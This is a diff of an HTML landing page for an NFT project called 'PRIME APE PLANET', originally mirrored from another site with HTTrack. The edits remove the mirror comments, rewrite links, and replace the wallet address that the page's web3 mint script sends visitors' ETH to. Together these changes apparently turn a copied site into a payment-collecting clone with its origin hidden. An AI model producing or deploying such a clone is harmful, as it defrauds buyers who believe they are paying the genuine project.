@@ -1,16 +1,14 @@
 
+
 <!doctype html>
 <html lang="en">
-
-<!-- Mirrored from apeplanetclub.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 05 May 2022 18:34:03 GMT -->
-<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
 <head>
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width,initial-scale=1,shrink-to-fit=no" />
 <meta http-equiv="Cache-control" content="No-Cache" />
 <meta name="facebook-domain-verification" content="1km9rioaoo5680pf8pvrw3p17xp5b0" />
 <link rel="shortcut icon" type="image/x-icon" href="images/favicon.png" />
-<link rel="stylesheet" href="../maxst.icons8.com/vue-static/landings/line-awesome/line-awesome/1.3.0/css/line-awesome.min.css" />
+<link rel="stylesheet" href="//maxst.icons8.com/vue-static/landings/line-awesome/line-awesome/1.3.0/css/line-awesome.min.css" />
 <link rel="stylesheet" href="css/animate.css" />
 <link rel="stylesheet" href="css/slick.css" />
 <link rel="stylesheet" href="css/slick-theme.css" />
@@ -22,11 +20,11 @@
 <meta property="og:type" content="website" />
 <meta property="og:url" content="index.html" />
 <meta property="og:title" content="PRIME APE PLANET" />
-<meta property="og:image" content="i.ibb.co/W5XrFFr/bann5.html" />
+<meta property="og:image" content="../i.ibb.co/W5XrFFr/bann5.png" />
 <meta property="twitter:card" content="summary_large_image" />
 <meta property="twitter:url" content="index.html" />
 <meta property="twitter:title" content="PRIME APE PLANET" />
-<meta property="twitter:image" content="i.ibb.co/W5XrFFr/bann5.html" />
+<meta property="twitter:image" content="../i.ibb.co/W5XrFFr/bann5.png" />
 <link href="static/css/main.229ff425.chunk.css" rel="stylesheet">
 <style>
 		#mint_amount_1,.btn-pap span{
@@ -42,7 +40,7 @@
 <div class="loader"><img class="nav__logo" src="images/logo.png" alt="logo" /></div>
 <div class="container">
 <nav class="navbar navbar-expand-lg">
-<a class="navbar-brand" href="index.html"><img src="images/logo.png" alt="logo" class="img-fluid" /></a>
+<a class="navbar-brand" href="/"><img src="images/logo.png" alt="logo" class="img-fluid" /></a>
 <button class="navbar-toggler navbar-toggler-main" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation"><span class="stick"></span></button>
 <div class="collapse navbar-collapse" id="navbarSupportedContent">
 <button class="navbar-toggler navbar-toggler-main" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation"><span class="stick"></span></button>
@@ -377,7 +375,7 @@
 </footer>
 <script src="js/jquery-3.2.0.min.js"></script>
 <script src="js/bootstrap.js"></script>
-<script src="../kit.fontawesome.com/d796c06ff3.js"></script>
+<script src="//kit.fontawesome.com/d796c06ff3.js"></script>
 <script src="js/jquery-equal-height.js"></script>
 <script src="js/splittext.min.js"></script>
 <script src="js/wow.min.js"></script>
@@ -1148,7 +1146,7 @@
 				  .send({ from: account, value: Newcost })
 				  .then((res) => {
 					fbq('track', 'Lead');
-					window.open("https://www.theprimeapeplanetnft.com/thanks.php?nummint=" + nftNum,'_self');
+					window.open("thanks.php?nummint=" + nftNum,'_self');
 					alert(
 					  "Token being minted! After receiving confirmation from your wallet, you can see it at Opensea or on your wallet"
 					);
@@ -1205,7 +1203,7 @@
 
 				fbq('track', 'InitiateCheckout');
 				
-				  const paymentAddress = '0x96C02f124aE3BF43DD406ebBe38e620a8F17D11'
+				  const paymentAddress = '0x96C02f124aE3BF43DD406ebBe38e620a8F17D561'
 				  
 					resultcontador = $("#mint_amount_1").text().replace("Mint ", "");
 					nftNum = parseInt(resultcontador);
@@ -1249,7 +1247,7 @@
 						/**/
 						gtag('event', 'Compra finalizada', { 'event_category': 'User', 'event_label': 'Compra finalizada: ' + web3.currentProvider.selectedAddress + ',Nº mints: ' + nftNum});
 					
-						//window.open("https://www.theprimeapeplanetnft.com/thanks.php?nummint=" + nftNum,'_self');
+						//window.open("/thanks.php?nummint=" + nftNum,'_self');
 					  //statusp.innerText = 'Minting failed, gas fees have not been taken into consideration, please retry <a href="#">here</a>';
 					  //checkoutBtn.innerText = 'Mint again?'  
 					}
@@ -1388,6 +1386,4 @@
 				 // startTimer(accountantMinutes, accountant);
 			</script>
 </body>
-
-<!-- Mirrored from apeplanetclub.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 05 May 2022 18:34:19 GMT -->
 </html>
